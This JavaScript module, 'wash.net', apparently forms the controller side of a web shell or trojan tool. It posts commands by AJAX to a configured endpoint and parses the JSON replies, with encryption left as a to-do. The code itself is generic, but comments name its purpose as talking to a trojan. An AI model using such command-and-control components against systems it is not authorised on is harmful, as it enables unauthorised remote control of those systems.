/**
 * Encapsulates communicating across the Internet
 */
wash.net = {

    // communicates out to the trojan
    send: function(callback){
        // @todo: encrypt here
        var ciphertext = wash.command;

        // make an AJAX request
        $.ajax({
            type : wash.connection.request_type,
            url  : wash.connection.protocol + '://' + wash.connection.domain + wash.connection.url,
            data : ciphertext,
        }).done(function(response){
            // invoke the callback function
            wash.net.receive(response, callback);
        });
    },

    // process communications from the trojan
    receive: function(response, callback){
        // @todo: decrypt here
        var plaintext = response;
    
        // parse the JSON response
        wash.response = JSON.parse(plaintext);

        // invoke the callback function
        callback();
    },
}
